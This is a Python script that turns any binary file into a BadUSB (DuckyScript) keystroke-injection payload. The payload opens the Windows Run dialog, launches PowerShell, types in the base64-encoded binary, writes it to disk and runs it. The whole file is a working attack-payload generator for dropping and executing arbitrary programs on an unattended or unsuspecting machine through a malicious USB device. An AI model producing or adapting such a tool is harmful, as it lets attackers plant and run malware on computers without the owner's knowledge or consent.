import sys
import base64

print(sys.argv)

if len(sys.argv) != 3:
    print("Usage: Python main.py BINARY_FILE OUTPUT_BAD_USB_FILE")
    print("E.G.")
    print("Python main.py helloworld.exe bad_usb_test.txt")
    exit(1)

bin_filename = sys.argv[1]
bad_usb_filename = sys.argv[2]

base64_data = None

try:
    with open(bin_filename, 'rb') as bin_file:
        base64_data = base64.encodebytes(bin_file.read())
except Exception as e:
    print(f"Unable to read {bin_filename}\n{e}")
    exit(2)

formatted_base64 = base64_data.decode('utf-8').replace('\n', '')

try:
    with open(bad_usb_filename, 'w') as bad_usb_file:
        bad_usb_file.write(f"GUI r\n")
        bad_usb_file.write(f"DELAY 500\n")
        bad_usb_file.write(f"STRING powershell\n")
        bad_usb_file.write(f"ENTER\n")
        bad_usb_file.write(f"STRING $b64str = '{formatted_base64}'\n")
        bad_usb_file.write(f"ENTER\n")
        bad_usb_file.write(f"STRING $bytes = [Convert]::FromBase64String($b64str)\n")
        bad_usb_file.write(f"ENTER\n")
        bad_usb_file.write(f"DELAY 500\n")
        bad_usb_file.write(f"STRING [io.file]::WriteAllBytes('{bin_filename}', $bytes)\n")
        bad_usb_file.write(f"ENTER\n")
        bad_usb_file.write(f"DELAY 500\n")
        bad_usb_file.write(f"STRING ./{bin_filename}\n")
        bad_usb_file.write(f"ENTER\n")
except Exception as e:
    print(f"Unable to read {bad_usb_filename}\n{e}")
    exit(2)
